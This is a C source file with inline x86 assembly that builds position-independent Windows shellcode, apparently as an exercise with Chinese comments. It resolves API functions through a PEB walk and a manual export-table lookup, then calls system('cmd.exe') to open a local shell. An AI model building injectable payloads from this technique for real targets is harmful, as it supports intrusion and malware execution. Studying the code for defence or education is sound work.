#include <windows.h>

void shellcode()
{
	
}

int main()
{
	_asm {
		pushad;
		sub esp, 0x20;
		jmp tag_ShellCode;
		//GetProcAddress tag_Next-49
		_asm _emit(0x47)_asm _emit(0x65)_asm _emit(0x74)_asm _emit(0x50)
		_asm _emit(0x72)_asm _emit(0x6F)_asm _emit(0x63)_asm _emit(0x41)
		_asm _emit(0x64)_asm _emit(0x64)_asm _emit(0x72)_asm _emit(0x65)
		_asm _emit(0x73)_asm _emit(0x73)_asm _emit(0x00)
		//LoadLibraryExA\0 tag_Next-3A
		_asm _emit(0x4C)_asm _emit(0x6F)_asm _emit(0x61)_asm _emit(0x64)
		_asm _emit(0x4C)_asm _emit(0x69)_asm _emit(0x62)_asm _emit(0x72)
		_asm _emit(0x61)_asm _emit(0x72)_asm _emit(0x79)_asm _emit(0x45)
		_asm _emit(0x78)_asm _emit(0x41)_asm _emit(0x00)
		//msvcrt.dll tag_Next-2B
		_asm _emit(0x6D)_asm _emit(0x73)_asm _emit(0x76)_asm _emit(0x63)
		_asm _emit(0x72)_asm _emit(0x74)_asm _emit(0x2E)_asm _emit(0x64)
		_asm _emit(0x6C)_asm _emit(0x6C)_asm _emit(0x00)
		//system tag_Next-20
		_asm _emit(0x73)_asm _emit(0x79)_asm _emit(0x73)_asm _emit(0x74)
		_asm _emit(0x65)_asm _emit(0x6D)_asm _emit(0x00)
		//cmd.exe tag_Next-19
		_asm _emit(0x63)_asm _emit(0x6D)_asm _emit(0x64)_asm _emit(0x2E)
		_asm _emit(0x65)_asm _emit(0x78)_asm _emit(0x65)_asm _emit(0x00)

		//ExitProcess tag_Next-11
		_asm _emit(0x45)_asm _emit(0x78)_asm _emit(0x69)_asm _emit(0x74)
		_asm _emit(0x50)_asm _emit(0x72)_asm _emit(0x6F)_asm _emit(0x63)
		_asm _emit(0x65)_asm _emit(0x73)_asm _emit(0x73)_asm _emit(0x00)

	tag_ShellCode:
		call tag_Next;
	tag_Next:
		pop ebx; BaseAddr
		mov esi, fs:[0x30]
		mov esi, dword ptr[esi + 0x0c]
		mov esi, dword ptr[esi + 0x1c]
		mov esi, dword ptr[esi]
		mov edx, dword ptr[esi + 0x8]; kernel32.dll
		push ebx
		push edx
		call fun_GetProcAddress;
		mov esi, eax;
		lea ecx, [ebx - 0x3A]; "LoadLibraryExA"
		push ecx; ProcName
		push edx; hModule
		call eax;
		//调用payload
		push ebx;
		push esi;
		push eax;
		push edx;
		call fun_PayLoad;
		xor eax, eax;
		popad;
		ret;

	fun_GetProcAddress:
		push ebp
		mov ebp, esp
		sub esp, 0x0c
		push edx
		mov edx, [ebp + 0x08]; kernel32.dll
		mov esi, [edx + 0x3c]; e_lfanew
		lea esi, [edx + esi];	PE文件头
		mov esi, [esi + 0x78];
		lea esi, [edx + esi]; 导出表VA
		mov edi, [esi + 0x1C];
		lea edi, [edx + edi]; EAT VA
		mov[ebp - 0x04], edi; 局部变量1
		mov edi, [esi + 0x20];
		lea edi, [edx + edi]; ENT VA
		mov[ebp - 0x08], edi; 局部变量2
		mov edi, [esi + 0x24];
		lea edi, [edx + edi]; EOT VA
		mov[ebp - 0x0C], edi; 局部变量3
		xor eax, eax;
		jmp tag_FirstCmp;
	tag_CmpNext:
		inc eax;
	tag_FirstCmp:
		mov esi, [ebp - 0x08]; 局部变量2
			mov esi, [esi + 4 * eax];
		mov edx, [ebp + 0x08]; Image_Base
			lea esi, [edx + esi];
		mov ebx, [ebp + 0x0C]; BaseAddr
			lea edi, [ebx - 0x49]; edi = "GetProcAddress"
			mov ecx, 0x0E; 字符串长度
			cld
			repe cmpsb
			//如果不相等循环比较
			jne tag_CmpNext;
		//成功
		mov esi, [ebp - 0x0C]; EOT
			xor edi, edi;
		mov di, [esi + eax * 2];
		//使用序号作为索引，找到函数名所对应的地址
		mov edx, [ebp - 0x04];
		mov esi, [edx + edi * 4];
		mov edx, [ebp + 0x08];
		//获取到关键函数地址
		lea eax, [edx + esi];
		pop edx;
		mov esp, ebp;
		pop ebp;
		ret 0x08

	fun_PayLoad:
		push ebp;
		mov ebp, esp;
		sub esp, 0x08;
		mov ebx, [ebp + 0x14];
		//获取system函数的地址
		lea ecx, [ebx - 0x2B];//msvcrt.dll
		push 0;//dwFlags = 0
		push 0;//hFilec = 0
		push ecx;//lpLibFileName = "msvcrt.dll"
		call[ebp + 0x0c];
		lea ecx, [ebx - 0x20];//system
		push ecx;	//lpProcName = "system"
		push eax;	//hModule = msvcrt.dll基址
		call[ebp + 0x10];//GetProcAddress
		mov[ebp - 0x04], eax;
		////获取ExitProces函数地址
		//lea ecx, [ebx - 0x11]; //ExitProcess
		//push ecx; ;//lpProcName
		//push[ebp + 0x08];//hModule
		//call[ebp + 0x10];//GetProcAddress
		//mov[ebp - 0x08], eax;

		//打开cmd
		lea ecx, [ebx - 0x19];//"cmd.exe"
		push ecx;
		;//push[ebp + 0x08];
		call[ebp - 0x04];
		//push 0;
		//call[ebp - 0x08];
		mov esp, ebp;
		pop ebp;
		ret 0x10;
	}
	return 0;
}